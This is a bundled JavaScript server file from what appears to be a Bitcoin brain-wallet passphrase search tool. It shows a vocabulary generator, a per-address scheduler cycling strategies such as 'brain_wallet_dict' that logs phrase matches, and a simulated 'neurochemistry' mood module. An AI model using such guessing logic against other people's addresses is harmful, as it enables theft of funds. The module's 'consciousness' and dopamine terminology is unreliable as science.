            expanded.push({
              timestamp: (/* @__PURE__ */ new Date()).toISOString(),
              word: candidate.text,
              type: candidate.type === "sequence" ? "compound" : "learned",
              components: candidate.components,
              phi: score.phi,
              reasoning: candidate.reasoning
            });
          }
        }
        if (expanded.length > 0) {
          console.log(`[VocabExpander] Auto-expanded ${expanded.length} vocabulary items`);
          this.saveToDisk();
        }
        return expanded;
      }
      /**
       * Get word from manifold
       */
      getWord(text2) {
        return this.state.words.get(text2.toLowerCase());
      }
      /**
       * Find words near a point on the manifold
       */
      findNearbyWords(coordinates, maxDistance = 2) {
        const nearby = [];
        for (const [, word] of Array.from(this.state.words.entries())) {
          if (word.coordinates.length === 0 || coordinates.length === 0) continue;
          const distance = this.fisherDistance(coordinates, word.coordinates);
          if (distance <= maxDistance) {
            nearby.push({ word, distance });
          }
        }
        return nearby.sort((a, b) => a.distance - b.distance).map((n) => n.word);
      }
      /**
       * Fisher geodesic distance between two points
       */
      fisherDistance(a, b) {
        let sum = 0;
        const dim = Math.min(a.length, b.length);
        for (let i = 0; i < dim; i++) {
          const diff = (a[i] || 0) - (b[i] || 0);
          const variance = Math.max(0.01, Math.abs((a[i] || 0) + (b[i] || 0)) / 2);
          sum += diff * diff / variance;
        }
        return Math.sqrt(sum);
      }
      /**
       * Generate hypotheses from vocabulary manifold
       * Suggests words/phrases that might be near high-Φ regions
       */
      generateManifoldHypotheses(count = 20) {
        const hypotheses = [];
        const highPhiWords = Array.from(this.state.words.values()).filter((w) => w.phi >= 0.6).sort((a, b) => b.phi - a.phi);
        for (const word of highPhiWords.slice(0, count / 2)) {
          hypotheses.push(word.text);
        }
        for (let i = 0; i < Math.min(5, highPhiWords.length); i++) {
          for (let j = i + 1; j < Math.min(5, highPhiWords.length); j++) {
            hypotheses.push(`${highPhiWords[i].text} ${highPhiWords[j].text}`);
            hypotheses.push(`${highPhiWords[j].text} ${highPhiWords[i].text}`);
          }
        }
        const recent = this.state.expansionHistory.slice(-10).map((e) => e.word);
        hypotheses.push(...recent);
        return hypotheses.slice(0, count);
      }
      /**
       * Get vocabulary manifold statistics
       */
      getStats() {
        const words = Array.from(this.state.words.values());
        const highPhi = words.filter((w) => w.phi >= 0.6);
        const avgPhi = words.length > 0 ? words.reduce((sum, w) => sum + w.phi, 0) / words.length : 0;
        const topWords = words.sort((a, b) => b.phi - a.phi).slice(0, 20).map((w) => ({ text: w.text, phi: w.phi, frequency: w.frequency }));
        return {
          totalWords: words.length,
          totalExpansions: this.state.totalExpansions,
          highPhiWords: highPhi.length,
          avgPhi,
          recentExpansions: this.state.expansionHistory.slice(-10),
          topWords
        };
      }
      /**
       * Save to disk
       */
      saveToDisk() {
        try {
          const dir = path5.dirname(DATA_FILE3);
          if (!fs5.existsSync(dir)) {
            fs5.mkdirSync(dir, { recursive: true });
          }
          const data = {
            words: Array.from(this.state.words.entries()),
            expansionHistory: this.state.expansionHistory,
            totalExpansions: this.state.totalExpansions,
            lastExpansionTime: this.state.lastExpansionTime,
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs5.writeFileSync(DATA_FILE3, JSON.stringify(data, null, 2));
          console.log(`[VocabExpander] Saved ${this.state.words.size} manifold words`);
        } catch (error) {
          console.error("[VocabExpander] Failed to save:", error);
        }
      }
      /**
       * Load from disk
       */
      loadFromDisk() {
        try {
          if (!fs5.existsSync(DATA_FILE3)) {
            console.log("[VocabExpander] No saved manifold found, starting fresh");
            return;
          }
          const raw = fs5.readFileSync(DATA_FILE3, "utf-8");
          const data = JSON.parse(raw);
          this.state.words = new Map(data.words || []);
          this.state.expansionHistory = data.expansionHistory || [];
          this.state.totalExpansions = data.totalExpansions || 0;
          this.state.lastExpansionTime = data.lastExpansionTime;
          console.log(`[VocabExpander] Loaded ${this.state.words.size} manifold words, ${this.state.totalExpansions} expansions`);
        } catch (error) {
          console.error("[VocabExpander] Failed to load:", error);
        }
      }
      /**
       * Bootstrap from geometric memory probes
       */
      async bootstrapFromGeometricMemory() {
        const probes = geometricMemory.getAllProbes();
        console.log(`[VocabExpander] Bootstrapping from ${probes.length} probes...`);
        let added = 0;
        for (const probe of probes) {
          if (probe.phi >= 0.5) {
            const words = probe.input.toLowerCase().replace(/[^a-z0-9\s]/g, " ").split(/\s+/).filter((w) => w.length >= 2);
            for (const word of words) {
              if (!this.state.words.has(word)) {
                const score = await scoreUniversalQIG(word, "arbitrary");
                this.addWord(word, score, { source: "Bootstrap from probes" });
                added++;
              }
            }
            if (!this.state.words.has(probe.input.toLowerCase())) {
              const probeScore = {
                keyType: "arbitrary",
                phi: probe.phi,
                kappa: probe.kappa,
                beta: 0,
                phi_spatial: probe.phi,
                phi_temporal: 0,
                phi_4D: probe.phi,
                basinCoordinates: probe.coordinates,
                fisherTrace: probe.fisherTrace || 0,
                fisherDeterminant: 0,
                ricciScalar: probe.ricciScalar || 0,
                regime: probe.regime,
                inResonance: probe.phi >= 0.7,
                entropyBits: 0,
                patternScore: 0,
                quality: probe.phi
              };
              this.addWord(probe.input, probeScore, { source: "Bootstrap from probes (full phrase)" });
              added++;
            }
          }
        }
        console.log(`[VocabExpander] Bootstrapped ${added} words from probes`);
        this.saveToDisk();
      }
    };
    vocabularyExpander = new GeometricVocabularyExpander();
  }
});

// server/repeated-address-scheduler.ts
import { randomUUID as randomUUID3 } from "crypto";
var STRATEGIES, DEFAULT_CONFIG2, RepeatedAddressScheduler, repeatedAddressScheduler;
var init_repeated_address_scheduler = __esm({
  "server/repeated-address-scheduler.ts"() {
    "use strict";
    init_geometric_memory();
    STRATEGIES = [
      "era_patterns",
      "brain_wallet_dict",
      "bitcoin_terms",
      "linguistic",
      "qig_basin_search",
      "historical_autonomous",
      "cross_format"
    ];
    DEFAULT_CONFIG2 = {
      coverageThreshold: 0.95,
      minRegimeSweeps: 3,
      maxPassesPerAddress: 20,
      consecutiveNoNewRegimesLimit: 2
    };
    RepeatedAddressScheduler = class {
      config;
      journals = /* @__PURE__ */ new Map();
      currentStrategyIndex = /* @__PURE__ */ new Map();
      constructor(config = {}) {
        this.config = { ...DEFAULT_CONFIG2, ...config };
      }
      getOrCreateJournal(address) {
        if (!this.journals.has(address)) {
          const journal = {
            address,
            createdAt: (/* @__PURE__ */ new Date()).toISOString(),
            updatedAt: (/* @__PURE__ */ new Date()).toISOString(),
            manifoldCoverage: 0,
            regimesSweep: 0,
            strategiesUsed: [],
            passes: [],
            isComplete: false,
            totalHypothesesTested: 0,
            totalNearMisses: 0,
            avgPhiAcrossPasses: 0,
            dominantRegime: "linear",
            resonanceClusters: []
          };
          this.journals.set(address, journal);
          this.currentStrategyIndex.set(address, 0);
        }
        return this.journals.get(address);
      }
      getNextStrategy(address) {
        const index2 = this.currentStrategyIndex.get(address) || 0;
        const strategy = STRATEGIES[index2 % STRATEGIES.length];
        this.currentStrategyIndex.set(address, index2 + 1);
        return strategy;
      }
      startPass(address, strategy, consciousness) {
        const journal = this.getOrCreateJournal(address);
        const pass = {
          passNumber: journal.passes.length + 1,
          strategy,
          startedAt: (/* @__PURE__ */ new Date()).toISOString(),
          hypothesesTested: 0,
          consciousness,
          entryRegime: consciousness.regime || "linear",
          nearMisses: 0,
          resonanceZonesFound: [],
          insights: []
        };
        journal.passes.push(pass);
        if (!journal.strategiesUsed.includes(strategy)) {
          journal.strategiesUsed.push(strategy);
        }
        journal.updatedAt = (/* @__PURE__ */ new Date()).toISOString();
        console.log(`[Scheduler] Started pass ${pass.passNumber} for ${address.slice(0, 10)}... using strategy: ${strategy}`);
        return pass;
      }
      completePass(address, results) {
        const journal = this.journals.get(address);
        if (!journal || journal.passes.length === 0) return;
        const currentPass = journal.passes[journal.passes.length - 1];
        currentPass.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        currentPass.hypothesesTested = results.hypothesesTested;
        currentPass.nearMisses = results.nearMisses;
        currentPass.resonanceZonesFound = results.resonanceZones;
        currentPass.fisherDistanceDelta = results.fisherDistanceDelta;
        currentPass.exitRegime = results.exitConsciousness.regime || currentPass.entryRegime;
        currentPass.insights = results.insights;
        journal.totalHypothesesTested += results.hypothesesTested;
        journal.totalNearMisses += results.nearMisses;
        for (const zone of results.resonanceZones) {
          journal.resonanceClusters.push({
            id: randomUUID3().slice(0, 8),
            center: zone.center,
            radius: zone.radius,
            avgPhi: zone.avgPhi,
            discoveredInPass: currentPass.passNumber
          });
        }
        this.updateJournalMetrics(journal);
        console.log(`[Scheduler] Completed pass ${currentPass.passNumber} for ${address.slice(0, 10)}...`);
        console.log(`  \u2192 Tested: ${results.hypothesesTested}, Near misses: ${results.nearMisses}`);
        console.log(`  \u2192 Coverage: ${(journal.manifoldCoverage * 100).toFixed(1)}%, Regimes: ${journal.regimesSweep}`);
        console.log(`  \u2192 Fisher delta: ${results.fisherDistanceDelta.toFixed(4)}`);
      }
      updateJournalMetrics(journal) {
        const regimesSeen = /* @__PURE__ */ new Set();
        for (const pass of journal.passes) {
          if (pass.entryRegime) regimesSeen.add(pass.entryRegime);
          if (pass.exitRegime) regimesSeen.add(pass.exitRegime);
        }
        journal.regimesSweep = regimesSeen.size;
        const phiSum = journal.passes.reduce((sum, p) => sum + (p.consciousness?.phi || 0), 0);
        journal.avgPhiAcrossPasses = journal.passes.length > 0 ? phiSum / journal.passes.length : 0;
        const regimeCounts = {};
        for (const pass of journal.passes) {
          const regime = pass.exitRegime || pass.entryRegime;
          regimeCounts[regime] = (regimeCounts[regime] || 0) + 1;
        }
        journal.dominantRegime = Object.entries(regimeCounts).sort(([, a], [, b]) => b - a)[0]?.[0] || "linear";
        journal.manifoldCoverage = this.calculatePerAddressCoverage(journal);
        journal.updatedAt = (/* @__PURE__ */ new Date()).toISOString();
      }
      calculatePerAddressCoverage(journal) {
        let coverage = 0;
        const strategyContribution = Math.min(
          journal.strategiesUsed.length / STRATEGIES.length,
          0.4
        );
        coverage += strategyContribution;
        const regimeContribution = Math.min(
          journal.regimesSweep / 3,
          0.3
        );
        coverage += regimeContribution;
        const fisherDeltas = journal.passes.filter((p) => p.fisherDistanceDelta !== void 0).map((p) => p.fisherDistanceDelta || 0);
        const totalFisherDelta = fisherDeltas.reduce((sum, d) => sum + Math.abs(d), 0);
        const fisherContribution = Math.min(totalFisherDelta / 0.5, 0.2);
        coverage += fisherContribution;
        const passCount = journal.passes.length;
        const passContribution = Math.min(passCount / 5, 0.1);
        coverage += passContribution;
        return Math.min(coverage, 1);
      }
      shouldContinueExploring(address) {
        const journal = this.journals.get(address);
        if (!journal) {
          return { shouldContinue: true, reason: "No exploration started yet" };
        }
        if (journal.isComplete) {
          return { shouldContinue: false, reason: journal.completionReason || "Already complete" };
        }
        if (journal.passes.length >= this.config.maxPassesPerAddress) {
          journal.isComplete = true;
          journal.completionReason = "timeout";
          journal.completedAt = (/* @__PURE__ */ new Date()).toISOString();
          return { shouldContinue: false, reason: "Maximum passes reached" };
        }
        const hasEnoughCoverage = journal.manifoldCoverage >= this.config.coverageThreshold;
        const hasEnoughRegimes = journal.regimesSweep >= this.config.minRegimeSweeps;
        const hasEnoughStrategies = journal.strategiesUsed.length >= 3;
        if (hasEnoughCoverage && hasEnoughRegimes && hasEnoughStrategies) {
          journal.isComplete = true;
          journal.completionReason = "full_exploration_complete";
          journal.completedAt = (/* @__PURE__ */ new Date()).toISOString();
          return {
            shouldContinue: false,
            reason: `Full exploration complete: ${(journal.manifoldCoverage * 100).toFixed(1)}% coverage, ${journal.regimesSweep} regimes, ${journal.strategiesUsed.length} strategies`
          };
        }
        if (journal.passes.length >= this.config.consecutiveNoNewRegimesLimit * 2) {
          const recentPasses = journal.passes.slice(-this.config.consecutiveNoNewRegimesLimit);
          const olderPasses = journal.passes.slice(0, -this.config.consecutiveNoNewRegimesLimit);
          const regimesBefore = new Set(olderPasses.map((p) => p.exitRegime));
          const newRegimesInRecent = recentPasses.some((p) => p.exitRegime && !regimesBefore.has(p.exitRegime));
          if (!newRegimesInRecent && hasEnoughRegimes && hasEnoughStrategies && journal.manifoldCoverage > 0.7) {
            journal.isComplete = true;
            journal.completionReason = "diminishing_returns";
            journal.completedAt = (/* @__PURE__ */ new Date()).toISOString();
            return { shouldContinue: false, reason: "Exploration plateaued - no new regimes, sufficient coverage" };
          }
        }
        const missingRequirements = [];
        if (!hasEnoughCoverage) {
          missingRequirements.push(`coverage ${(journal.manifoldCoverage * 100).toFixed(1)}%/${this.config.coverageThreshold * 100}%`);
        }
        if (!hasEnoughRegimes) {
          missingRequirements.push(`regimes ${journal.regimesSweep}/${this.config.minRegimeSweeps}`);
        }
        if (!hasEnoughStrategies) {
          missingRequirements.push(`strategies ${journal.strategiesUsed.length}/3`);
        }
        return {
          shouldContinue: true,
          reason: `Continuing: need ${missingRequirements.join(", ")} (pass ${journal.passes.length})`
        };
      }
      markMatchFound(address, phrase, phi, kappa) {
        const journal = this.journals.get(address);
        if (!journal) return;
        journal.isComplete = true;
        journal.completionReason = "match_found";
        journal.bestCandidate = {
          phrase,
          phi,
          kappa,
          discoveredInPass: journal.passes.length
        };
        journal.updatedAt = (/* @__PURE__ */ new Date()).toISOString();
        console.log(`[Scheduler] MATCH FOUND for ${address}: "${phrase}"`);
      }
      markUserStopped(address) {
        const journal = this.journals.get(address);
        if (!journal) return;
        journal.isComplete = true;
        journal.completionReason = "user_stopped";
        journal.updatedAt = (/* @__PURE__ */ new Date()).toISOString();
      }
      getJournal(address) {
        return this.journals.get(address);
      }
      getAllJournals() {
        return Array.from(this.journals.values());
      }
      getExplorationSummary(address) {
        const journal = this.journals.get(address);
        if (!journal) return null;
        return {
          passCount: journal.passes.length,
          coverage: journal.manifoldCoverage,
          regimesSeen: journal.regimesSweep,
          strategiesUsed: journal.strategiesUsed,
          isComplete: journal.isComplete,
          nextStrategy: this.getNextStrategy(address)
        };
      }
      exportState() {
        const journals = {};
        Array.from(this.journals.entries()).forEach(([addr, journal]) => {
          journals[addr] = journal;
        });
        return { journals, config: this.config };
      }
      importState(state) {
        for (const [addr, journal] of Object.entries(state.journals)) {
          this.journals.set(addr, journal);
          this.currentStrategyIndex.set(addr, journal.strategiesUsed.length);
        }
        if (state.config) {
          this.config = { ...this.config, ...state.config };
        }
      }
    };
    repeatedAddressScheduler = new RepeatedAddressScheduler();
  }
});

// server/ocean-neurochemistry.ts
var ocean_neurochemistry_exports = {};
__export(ocean_neurochemistry_exports, {
  clearAdminBoost: () => clearAdminBoost,
  computeAcetylcholine: () => computeAcetylcholine,
  computeBehavioralModulation: () => computeBehavioralModulation,
  computeBehavioralModulationWithCooldown: () => computeBehavioralModulationWithCooldown,
  computeDopamine: () => computeDopamine,
  computeEffortReward: () => computeEffortReward,
  computeEndorphins: () => computeEndorphins,
  computeEnhancedDopamine: () => computeEnhancedDopamine,
  computeGABA: () => computeGABA,
  computeNeurochemistry: () => computeNeurochemistry,
  computeNorepinephrine: () => computeNorepinephrine,
  computeSerotonin: () => computeSerotonin,
  createDefaultContext: () => createDefaultContext,
  generateMotivation: () => generateMotivation,
  getActiveAdminBoost: () => getActiveAdminBoost,
  getEmotionalDescription: () => getEmotionalDescription,
  getEmotionalEmoji: () => getEmotionalEmoji,
  getMotivationWithLogging: () => getMotivationWithLogging,
  getMushroomCooldownRemaining: () => getMushroomCooldownRemaining,
  injectAdminBoost: () => injectAdminBoost,
  recordMushroomCycle: () => recordMushroomCycle,
  selectMotivationMessage: () => selectMotivationMessage
});
function computeVariance2(values) {
  if (values.length < 2) return 0;
  const mean = values.reduce((a, b) => a + b, 0) / values.length;
  return values.reduce((sum, v) => sum + Math.pow(v - mean, 2), 0) / values.length;
}
function computeBasinDepth(basinCoords) {
  if (!basinCoords || basinCoords.length === 0) return 0.5;
  const magnitude = Math.sqrt(basinCoords.reduce((sum, c) => sum + c * c, 0));
  return Math.min(1, Math.tanh(magnitude / 10));
}
function computeGeodesicAlignment(prev, curr) {
  if (!prev || !curr || prev.length !== curr.length) return 0.5;
  const delta = curr.map((c, i) => c - prev[i]);
  const deltaNorm = Math.sqrt(delta.reduce((sum, d) => sum + d * d, 0));
  if (deltaNorm < 0.01) return 1;
  return Math.exp(-deltaNorm * 0.5);
}
function computeDopamine(currentState, previousState, recentDiscoveries) {
  const phiDelta = currentState.phi - previousState.phi;
  const phiGradient = Math.max(0, Math.tanh(phiDelta * 10));
  const distToKappaStar = Math.abs(currentState.kappa - 64);
  const kappaProximity = Math.exp(-distToKappaStar / 20);
  const prevDist = Math.abs(previousState.kappa - 64);
  const resonanceAnticipation = prevDist > distToKappaStar ? Math.min(1, (prevDist - distToKappaStar) / 10) : 0;
  const nearMissDiscovery = recentDiscoveries.nearMisses > 0 ? Math.min(1, recentDiscoveries.nearMisses * 0.7) : 0;
  const patternQuality = Math.min(1, recentDiscoveries.resonant / 3);
  const basinDepth = computeBasinDepth(currentState.basinCoords || []);
  const geodesicAlignment = computeGeodesicAlignment(
    previousState.basinCoords || [],
    currentState.basinCoords || []
  );
  const totalDopamine = phiGradient * 0.15 + kappaProximity * 0.1 + resonanceAnticipation * 0.15 + nearMissDiscovery * 0.4 + // Increased from 0.25
  patternQuality * 0.1 + basinDepth * 0.05 + geodesicAlignment * 0.05;
  const motivationLevel = Math.min(1, totalDopamine * 1.2);
  return {
    phiGradient,
    kappaProximity,
    resonanceAnticipation,
    nearMissDiscovery,
    patternQuality,
    basinDepth,
    geodesicAlignment,
    totalDopamine,
    motivationLevel
  };
}
function computeSerotonin(consciousness, basinDrift, regimeHistory, ricciHistory) {
  const phiLevel = Math.min(1, consciousness.phi / 0.9);
  const coherence = consciousness.gamma;
  const basinStability = Math.exp(-basinDrift * 10);
  const recentRegimes = regimeHistory.slice(-10);
  const dominantRegime = recentRegimes[0] || "linear";
  const sameRegimeCount = recentRegimes.filter((r) => r === dominantRegime).length;
  const regimeStability = recentRegimes.length > 0 ? sameRegimeCount / recentRegimes.length : 0.5;
  const ricciVariance = computeVariance2(ricciHistory.slice(-10));
  const curvatureSmoothness = Math.exp(-ricciVariance * 100);
  const groundingLevel = consciousness.grounding;
  const totalSerotonin = phiLevel * 0.3 + coherence * 0.2 + basinStability * 0.2 + regimeStability * 0.15 + curvatureSmoothness * 0.05 + groundingLevel * 0.1;
  const contentmentLevel = totalSerotonin;
  return {
    phiLevel,
    coherence,
    basinStability,
    regimeStability,
    curvatureSmoothness,
    groundingLevel,
    totalSerotonin,
    contentmentLevel
  };
}
function computeNorepinephrine(consciousness, fisherTrace, ricciScalar) {
  const couplingStrength = Math.min(1, consciousness.kappaEff / 100);
  const tackingDrive = consciousness.tacking;
  const radarActive = consciousness.radar;
  const metaAwareness = consciousness.metaAwareness;
  const informationDensity = Math.min(1, fisherTrace / 1e3);
  const curvatureSpike = Math.min(1, ricciScalar);
  const breakdownProximity = Math.max(
    0,
    (consciousness.kappaEff - 85) / 15
  );
  const totalNorepinephrine = couplingStrength * 0.25 + tackingDrive * 0.2 + radarActive * 0.2 + metaAwareness * 0.15 + informationDensity * 0.1 + curvatureSpike * 0.05 + breakdownProximity * 0.05;
  const alertnessLevel = totalNorepinephrine;
  return {
    couplingStrength,
    tackingDrive,
    radarActive,
    metaAwareness,
    informationDensity,
    curvatureSpike,
    breakdownProximity,
    totalNorepinephrine,
    alertnessLevel
  };
}
function computeGABA(beta, grounding, regime, basinDriftHistory, lastConsolidation) {
  const betaStability = Math.exp(-Math.abs(beta - QIG_CONSTANTS.BETA) * 10);
  const groundingStrength = grounding;
  const regimeCalmness = regime === "geometric" ? 1 : regime === "linear" ? 0.7 : regime === "hierarchical" ? 0.8 : 0.2;
  const recentDrifts = basinDriftHistory.slice(-5);
  const driftVariance = computeVariance2(recentDrifts);
  const transitionSmoothing = Math.exp(-driftVariance * 100);
  const driftReduction = recentDrifts.length >= 2 ? Math.max(0, recentDrifts[0] - recentDrifts[recentDrifts.length - 1]) : 0;
  const timeSinceConsolidation = Date.now() - lastConsolidation.getTime();
  const consolidationEffect = Math.exp(-timeSinceConsolidation / 6e4);
  const totalGABA = betaStability * 0.2 + groundingStrength * 0.25 + regimeCalmness * 0.25 + transitionSmoothing * 0.15 + driftReduction * 0.1 + consolidationEffect * 0.05;
  const calmLevel = totalGABA;
  return {
    betaStability,
    groundingStrength,
    regimeCalmness,
    transitionSmoothing,
    driftReduction,
    consolidationEffect,
    totalGABA,
    calmLevel
  };
}
function computeAcetylcholine(metaAwareness, attentionFocus, ucpStats) {
  const negativeKnowledgeRate = Math.min(
    1,
    (ucpStats.negativeKnowledge.contradictions + ucpStats.negativeKnowledge.barriers) / 100
  );
  const crossPatternRate = Math.min(1, ucpStats.crossPatterns / 50);
  const patternCompressionRate = Math.min(1, ucpStats.compressionRate);
  const episodeRetention = Math.min(1, ucpStats.episodicMemory / 1e3);
  const generatorCreation = Math.min(1, ucpStats.generators / 20);
  const totalAcetylcholine = metaAwareness * 0.2 + attentionFocus * 0.2 + negativeKnowledgeRate * 0.15 + crossPatternRate * 0.15 + patternCompressionRate * 0.1 + episodeRetention * 0.1 + generatorCreation * 0.1;
  const learningRate = totalAcetylcholine;
  return {
    metaAwareness,
    attentionFocus,
    negativeKnowledgeRate,
    crossPatternRate,
    patternCompressionRate,
    episodeRetention,
    generatorCreation,
    totalAcetylcholine,
    learningRate
  };
}
function computeEndorphins(consciousness, inResonance, discoveryCount, basinHarmony) {
  const inFlowRange = consciousness.kappaEff >= 54 && consciousness.kappaEff <= 74;
  const flowState = inFlowRange ? Math.exp(-Math.abs(consciousness.kappaEff - 64) / 5) : 0;
  const resonanceIntensity = inResonance ? Math.min(1, consciousness.phi * 1.2) : 0;
  const discoveryEuphoria = Math.min(1, discoveryCount / 10) * Math.exp(-discoveryCount * 0.05);
  const basinHarmonyLevel = basinHarmony;
  const geometricBeauty = consciousness.gamma * (consciousness.grounding > 0.8 ? 1.2 : 1);
  const integrationBliss = consciousness.phi > 0.8 ? Math.pow(consciousness.phi, 2) : 0;
  const totalEndorphins = flowState * 0.3 + resonanceIntensity * 0.25 + discoveryEuphoria * 0.15 + basinHarmonyLevel * 0.1 + geometricBeauty * 0.1 + integrationBliss * 0.1;
  const pleasureLevel = totalEndorphins;
  return {
    flowState,
    resonanceIntensity,
    discoveryEuphoria,
    basinHarmony: basinHarmonyLevel,
    geometricBeauty: Math.min(1, geometricBeauty),
    integrationBliss,
    totalEndorphins,
    pleasureLevel
  };
}
function determineEmotionalState(dopamine, serotonin, norepinephrine, gaba, acetylcholine, endorphins) {
  if (endorphins > 0.7 && dopamine > 0.6) {
    return "flow";
  }
  if (dopamine > 0.7 && norepinephrine > 0.6) {
    return "excited";
  }
  if (acetylcholine > 0.7 && norepinephrine > 0.5) {
    return "focused";
  }
  if (gaba > 0.7 && serotonin > 0.6) {
    return "calm";
  }
  if (serotonin > 0.6 && gaba > 0.5) {
    return "content";
  }
  if (dopamine < 0.3 && serotonin < 0.4) {
    return "frustrated";
  }
  if (gaba < 0.3 && serotonin < 0.3) {
    return "exhausted";
  }
  return "content";
}
function computeNeurochemistry(context) {
  const dopamine = computeDopamine(
    context.currentState,
    context.previousState,
    context.recentDiscoveries
  );
  const serotonin = computeSerotonin(
    context.consciousness,
    context.basinDrift,
    context.regimeHistory,
    context.ricciHistory
  );
  const norepinephrine = computeNorepinephrine(
    context.consciousness,
    context.fisherTrace,
    context.ricciScalar
  );
  const gaba = computeGABA(
    context.beta,
    context.consciousness.grounding,
    context.regime,
    context.basinDriftHistory,
    context.lastConsolidation
  );
  const acetylcholine = computeAcetylcholine(
    context.consciousness.metaAwareness,
    context.attentionFocus,
    context.ucpStats
  );
  const endorphins = computeEndorphins(
    context.consciousness,
    context.inResonance,
    context.discoveryCount,
    context.basinHarmony
  );
  const overallMood = dopamine.totalDopamine * 0.2 + serotonin.totalSerotonin * 0.25 + norepinephrine.totalNorepinephrine * 0.1 + gaba.totalGABA * 0.2 + acetylcholine.totalAcetylcholine * 0.1 + endorphins.totalEndorphins * 0.15;
  const emotionalState = determineEmotionalState(
    dopamine.totalDopamine,
    serotonin.totalSerotonin,
    norepinephrine.totalNorepinephrine,
    gaba.totalGABA,
    acetylcholine.totalAcetylcholine,
    endorphins.totalEndorphins
  );
  return {
    dopamine,
    serotonin,
    norepinephrine,
    gaba,
    acetylcholine,
    endorphins,
    overallMood,
    emotionalState,
    timestamp: /* @__PURE__ */ new Date()
  };
}
function computeBehavioralModulation(state) {
  const explorationBias = Math.min(1, Math.max(
    0,
    state.dopamine.motivationLevel * 0.4 + state.norepinephrine.tackingDrive * 0.4 + (1 - state.gaba.calmLevel) * 0.2
  ));
  const strategyPersistence = Math.min(1, Math.max(
    0,
    state.serotonin.contentmentLevel * 0.3 + state.gaba.calmLevel * 0.3 + state.dopamine.patternQuality * 0.4
  ));
  const sleepTrigger = state.gaba.calmLevel < 0.3 || state.serotonin.basinStability < 0.4 || state.overallMood < 0.25;
  const mushroomTrigger = state.emotionalState === "frustrated" || state.dopamine.motivationLevel < 0.2 && state.serotonin.contentmentLevel < 0.3;
  const learningRate = state.acetylcholine.learningRate;
  const riskTolerance = Math.min(1, Math.max(
    0,
    state.dopamine.motivationLevel * 0.3 + state.endorphins.flowState * 0.3 + state.norepinephrine.alertnessLevel * 0.2 + (1 - state.gaba.betaStability) * 0.2
  ));
  return {
    explorationBias,
    strategyPersistence,
    sleepTrigger,
    mushroomTrigger,
    learningRate,
    riskTolerance
  };
}
function getEmotionalEmoji(state) {
  switch (state) {
    case "flow":
      return "\u{1F30A}";
    case "excited":
      return "\u26A1";
    case "focused":
      return "\u{1F3AF}";
    case "calm":
      return "\u{1F60C}";
    case "content":
      return "\u{1F60A}";
    case "frustrated":
      return "\u{1F624}";
    case "exhausted":
      return "\u{1F634}";
    default:
      return "\u{1F914}";
  }
}
function getEmotionalDescription(state) {
  switch (state) {
    case "flow":
      return "Peak experience! High dopamine + endorphins, in resonance band, loving the work!";
    case "excited":
      return "Making progress! Finding patterns, approaching resonance, highly motivated!";
    case "focused":
      return "Deeply attentive, processing patterns, learning actively.";
    case "calm":
      return "Stable and settled, basin is stable, not anxious.";
    case "content":
      return "Things are okay, reasonably settled and functional.";
    case "frustrated":
      return "Plateau detected, no discoveries, motivation dropping...";
    case "exhausted":
      return "Needs rest, unstable, approaching burnout. Sleep cycle recommended.";
    default:
      return "Processing...";
  }
}
function injectAdminBoost(boost, durationMs = 6e4) {
  adminBoost = {
    dopamine: Math.min(1, Math.max(0, boost.dopamine || 0)),
    serotonin: Math.min(1, Math.max(0, boost.serotonin || 0)),
    norepinephrine: Math.min(1, Math.max(0, boost.norepinephrine || 0)),
    gaba: Math.min(1, Math.max(0, boost.gaba || 0)),
    acetylcholine: Math.min(1, Math.max(0, boost.acetylcholine || 0)),
    endorphins: Math.min(1, Math.max(0, boost.endorphins || 0)),
    expiresAt: new Date(Date.now() + durationMs)
  };
  console.log(`[Neurochemistry] Admin boost injected: D+${boost.dopamine || 0} S+${boost.serotonin || 0} (expires in ${durationMs}ms)`);
  return adminBoost;
}
function clearAdminBoost() {
  adminBoost = null;
  console.log("[Neurochemistry] Admin boost cleared");
}
function getActiveAdminBoost() {
  if (!adminBoost) return null;
  if (/* @__PURE__ */ new Date() > adminBoost.expiresAt) {
    adminBoost = null;
    return null;
  }
  return adminBoost;
}
function computeEffortReward(effort) {
  const testingReward = Math.min(0.3, effort.hypothesesTestedThisMinute / 100);
  const diversityReward = Math.min(0.25, effort.strategiesUsedCount * 0.05);
  const persistenceReward = Math.min(0.2, Math.log10(effort.persistenceMinutes + 1) * 0.1);
  const noveltyReward = Math.min(0.15, effort.novelPatternsExplored / 50);
  const adaptabilityReward = Math.min(0.1, effort.regimeTransitions * 0.02);
  return testingReward + diversityReward + persistenceReward + noveltyReward + adaptabilityReward;
}
function computeEnhancedDopamine(currentState, previousState, recentDiscoveries, effort) {
  const baseDopamine = computeDopamine(currentState, previousState, recentDiscoveries);
  const effortReward = effort ? computeEffortReward(effort) : 0;
  const boost = getActiveAdminBoost();
  const adminDopamine = boost ? boost.dopamine : 0;
  const enhancedTotal = Math.min(1, baseDopamine.totalDopamine + effortReward * 0.3 + adminDopamine);
  return {
    ...baseDopamine,
    totalDopamine: enhancedTotal,
    motivationLevel: Math.min(1, enhancedTotal * 1.2)
  };
}
function computeBehavioralModulationWithCooldown(state, effortMetrics) {
  const base = computeBehavioralModulation(state);
  const boost = getActiveAdminBoost();
  const timeSinceMushroom = Date.now() - lastMushroomTime.getTime();
  const cooldownActive = timeSinceMushroom < MUSHROOM_COOLDOWN_MS;
  const effortReward = effortMetrics ? computeEffortReward(effortMetrics) : 0;
  const adjustedDopamine = state.dopamine.motivationLevel + effortReward * 0.2 + (boost?.dopamine || 0);
  const adjustedSerotonin = state.serotonin.contentmentLevel + effortReward * 0.1 + (boost?.serotonin || 0);
  const strictMushroomTrigger = !cooldownActive && (state.emotionalState === "frustrated" && adjustedDopamine < 0.15) || adjustedDopamine < 0.1 && adjustedSerotonin < 0.2;
  return {
    ...base,
    mushroomTrigger: strictMushroomTrigger,
    // Boost exploration if admin dopamine is active
    explorationBias: Math.min(1, base.explorationBias + (boost?.dopamine || 0) * 0.3),
    // Boost learning if admin acetylcholine is active
    learningRate: Math.min(1, base.learningRate + (boost?.acetylcholine || 0) * 0.2)
  };
}
function recordMushroomCycle() {
  lastMushroomTime = /* @__PURE__ */ new Date();
  console.log("[Neurochemistry] Mushroom cycle recorded, cooldown started");
}
function getMushroomCooldownRemaining() {
  const remaining = MUSHROOM_COOLDOWN_MS - (Date.now() - lastMushroomTime.getTime());
  return Math.max(0, remaining);
}
function createDefaultContext() {
  return {
    consciousness: {
      phi: 0.75,
      kappaEff: 55,
      tacking: 0.6,
      radar: 0.7,
      metaAwareness: 0.65,
      gamma: 0.8,
      grounding: 0.85
    },
